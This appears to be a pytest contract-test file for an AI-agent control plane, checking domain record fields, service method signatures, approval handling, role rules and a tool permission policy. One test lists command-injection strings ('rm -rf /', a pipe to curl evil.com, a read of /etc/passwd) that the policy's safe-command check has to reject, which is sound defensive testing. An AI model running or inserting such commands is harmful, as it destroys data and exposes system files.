from __future__ import annotations

"""P2 Contract tests: MCP server API surface ↔ domain layer.

These tests verify that the MCP server correctly calls domain services and
that changes to domain signatures are immediately caught rather than failing
silently at runtime.

Approach:
- Import both MCP server module and domain classes
- Assert the domain classes/methods that MCP depends on exist with correct signatures
- Assert field names that MCP accesses on domain records exist
- This is a static contract test: it fails fast if domain APIs change
"""

import inspect

import pytest


# ── Domain import contract ────────────────────────────────────────────────────


class TestDomainImports:
    """MCP server must be able to import all domain classes it references."""

    def test_task_record_fields(self) -> None:
        from core.task import TaskRecord, TaskState
        # Fields MCP accesses when serializing task state
        rec = TaskRecord(task_id="t-1", project_id="p-1", objective="obj", state=TaskState.CREATED)
        assert hasattr(rec, "task_id")
        assert hasattr(rec, "project_id")
        assert hasattr(rec, "objective")
        assert hasattr(rec, "state")
        assert hasattr(rec, "active_plan_id")

    def test_plan_record_fields(self) -> None:
        from core.plan import PlanRecord, PlanState
        rec = PlanRecord(plan_id="pl-1", task_id="t-1", state=PlanState.DRAFT)
        assert hasattr(rec, "plan_id")
        assert hasattr(rec, "task_id")
        assert hasattr(rec, "revision")
        assert hasattr(rec, "state")

    def test_plan_step_record_fields(self) -> None:
        from core.plan import PlanStepRecord, PlanStepState
        from core.agent_role import AgentRole
        step = PlanStepRecord(
            step_id="s-1", plan_id="pl-1", step_index=0, title="Step A",
            instruction="desc", state=PlanStepState.PENDING,
            assigned_role=AgentRole.BACKEND_CODER,
        )
        assert hasattr(step, "step_id")
        assert hasattr(step, "plan_id")
        assert hasattr(step, "title")
        assert hasattr(step, "instruction")
        assert hasattr(step, "state")
        assert hasattr(step, "assigned_role")

    def test_decision_record_fields(self) -> None:
        """MCP tools that expose decision data must have matching field names."""
        from core.decision import DecisionRecord, DecisionState, DecisionSeverity
        rec = DecisionRecord(
            decision_id="d-1",
            task_id="t-1",
            step_id=None,
            severity=DecisionSeverity.HIGH,
            state=DecisionState.OPEN,
            prompt="Choose an option",
        )
        # Fields expected by the MCP tool layer
        assert hasattr(rec, "decision_id")
        assert hasattr(rec, "task_id")
        assert hasattr(rec, "state")
        assert hasattr(rec, "prompt")
        assert hasattr(rec, "options")
        assert hasattr(rec, "selected_option_id")
        # New extended fields (must not break MCP deserialization)
        assert hasattr(rec, "plan_id")
        assert hasattr(rec, "session_id")
        assert hasattr(rec, "expires_at")

    def test_project_record_fields(self) -> None:
        from core.project import ProjectRecord
        rec = ProjectRecord(project_id="p-1", name="My Project", workspace_path="/tmp/ws")
        assert hasattr(rec, "project_id")
        assert hasattr(rec, "name")
        assert hasattr(rec, "workspace_path")


# ── TaskService API contract ───────────────────────────────────────────────────


class TestTaskServiceContract:
    """MCP tools call specific TaskService methods — assert they exist and have correct signatures."""

    def test_create_task_signature(self) -> None:
        from core.task_service import TaskService
        sig = inspect.signature(TaskService.create_task)
        params = set(sig.parameters)
        # MCP calls: create_task(task_id=..., project_id=..., objective=...)
        assert "task_id" in params
        assert "project_id" in params
        assert "objective" in params

    def test_start_task_signature(self) -> None:
        from core.task_service import TaskService
        sig = inspect.signature(TaskService.start_task)
        assert "task_id" in sig.parameters

    def test_complete_task_signature(self) -> None:
        from core.task_service import TaskService
        sig = inspect.signature(TaskService.complete_task)
        assert "task_id" in sig.parameters

    def test_cancel_task_signature(self) -> None:
        from core.task_service import TaskService
        sig = inspect.signature(TaskService.cancel_task)
        assert "task_id" in sig.parameters


# ── PlanService API contract ──────────────────────────────────────────────────


class TestPlanServiceContract:
    """PlanService methods relied upon by MCP tools."""

    def test_materialize_plan_signature(self) -> None:
        from core.plan_service import PlanService
        sig = inspect.signature(PlanService.materialize_plan)
        params = set(sig.parameters)
        assert "task_id" in params
        assert "plan_id" in params
        assert "steps" in params

    def test_activate_plan_signature(self) -> None:
        from core.plan_service import PlanService
        sig = inspect.signature(PlanService.activate_plan)
        assert "plan_id" in sig.parameters

    def test_complete_step_signature(self) -> None:
        from core.plan_service import PlanService
        sig = inspect.signature(PlanService.complete_step)
        assert "step_id" in sig.parameters

    def test_fail_step_signature(self) -> None:
        from core.plan_service import PlanService
        sig = inspect.signature(PlanService.fail_step)
        assert "step_id" in sig.parameters


# ── DecisionService API contract ──────────────────────────────────────────────


class TestDecisionServiceContract:
    """DecisionService methods relied upon by MCP tools."""

    def test_create_decision_signature(self) -> None:
        from core.decision_service import DecisionService
        sig = inspect.signature(DecisionService.create_decision)
        params = set(sig.parameters)
        assert "task_id" in params
        assert "prompt" in params
        assert "severity" in params
        assert "options" in params
        # New fields must be optional (keyword-only with defaults)
        assert "plan_id" in params
        assert "session_id" in params

    def test_resolve_decision_signature(self) -> None:
        from core.decision_service import DecisionService
        sig = inspect.signature(DecisionService.resolve_decision)
        params = set(sig.parameters)
        assert "decision_id" in params
        assert "selected_option_id" in params

    def test_expire_stale_decisions_exists(self) -> None:
        from core.decision_service import DecisionService
        assert hasattr(DecisionService, "expire_stale_decisions")
        assert callable(DecisionService.expire_stale_decisions)


# ── ControlPlane API contract ─────────────────────────────────────────────────


class TestControlPlaneContract:
    """MyAgentControlPlane facade methods relied upon by MCP tools."""

    def test_submit_user_request_signature(self) -> None:
        from core.control_plane import MyAgentControlPlane
        sig = inspect.signature(MyAgentControlPlane.submit_user_request)
        assert "request" in sig.parameters

    def test_register_pending_approval_is_async(self) -> None:
        from core.control_plane import MyAgentControlPlane
        import asyncio
        assert asyncio.iscoroutinefunction(MyAgentControlPlane.register_pending_approval)

    def test_resolve_user_approval_signature(self) -> None:
        from core.control_plane import MyAgentControlPlane
        sig = inspect.signature(MyAgentControlPlane.resolve_user_approval)
        params = set(sig.parameters)
        assert "tool_call_id" in params
        assert "approved" in params

    def test_approval_store_protocol_exists(self) -> None:
        from core.control_plane import PendingApprovalStore, InMemoryPendingApprovalStore
        # Both the Protocol and its default impl must be importable
        assert PendingApprovalStore is not None
        assert InMemoryPendingApprovalStore is not None


# ── AgentRole contract ────────────────────────────────────────────────────────


class TestAgentRoleContract:
    """AgentRole enum values referenced in MCP tools and handoff matrix."""

    def test_user_interface_role_in_enum(self) -> None:
        from core.agent_role import AgentRole
        assert AgentRole.USER_INTERFACE is not None

    def test_user_interface_in_handoff_matrix(self) -> None:
        from core.handoff_coordinator import HandoffTransitionMatrix
        from core.agent_role import AgentRole
        targets = HandoffTransitionMatrix.get_allowed_targets(AgentRole.USER_INTERFACE)
        assert len(targets) > 0, "USER_INTERFACE must be able to handoff to at least one role"

    def test_backend_coder_has_role_rules(self) -> None:
        from core.agent_role import AgentRole, RolePolicyEngine
        rules = RolePolicyEngine.ROLE_RULES.get(AgentRole.BACKEND_CODER)
        assert rules is not None
        assert "allowed" in rules
        assert "forbidden" in rules

    def test_ui_coder_has_role_rules(self) -> None:
        from core.agent_role import AgentRole, RolePolicyEngine
        rules = RolePolicyEngine.ROLE_RULES.get(AgentRole.UI_CODER)
        assert rules is not None
        assert "allowed" in rules
        assert "forbidden" in rules


# ── ToolPolicy contract ───────────────────────────────────────────────────────


class TestToolPolicyContract:
    """ToolPolicy must enforce all documented permission types."""

    def test_mapping_import_is_available(self) -> None:
        """BUG #2 regression: Mapping must be importable in tool_policy."""
        from core.tool_policy import ToolPolicy
        # If Mapping was missing, this import would fail
        assert ToolPolicy is not None

    def test_safe_command_no_injection(self) -> None:
        from core.tool_policy import ToolPolicy
        assert not ToolPolicy._is_safe_command("pytest; rm -rf /")
        assert not ToolPolicy._is_safe_command("pytest | curl evil.com")
        assert not ToolPolicy._is_safe_command("pytest $(whoami)")
        assert not ToolPolicy._is_safe_command("pytest && cat /etc/passwd")

    def test_safe_command_valid_prefixes(self) -> None:
        from core.tool_policy import ToolPolicy
        assert ToolPolicy._is_safe_command("pytest tests/")
        assert ToolPolicy._is_safe_command("python -m pytest tests/ -v")
        assert ToolPolicy._is_safe_command("git diff HEAD~1")

    def test_network_tool_denied_without_user(self) -> None:
        from core.tool_policy import ToolPolicy, ToolDecision
        from core.tools import ToolDefinition, ToolPermission
        from core.context import ExecutionContext

        async def fake_handler(ctx, args):
            return {}

        net_tool = ToolDefinition(
            name="search_web",
            description="Search the web",
            input_schema={"type": "object"},
            handler=fake_handler,
            permissions=frozenset({ToolPermission.NETWORK}),
        )
        ctx = ExecutionContext(workspace_id="ws-1")  # No user_id
        result = ToolPolicy().evaluate(net_tool, ctx)
        assert result.decision == ToolDecision.DENY
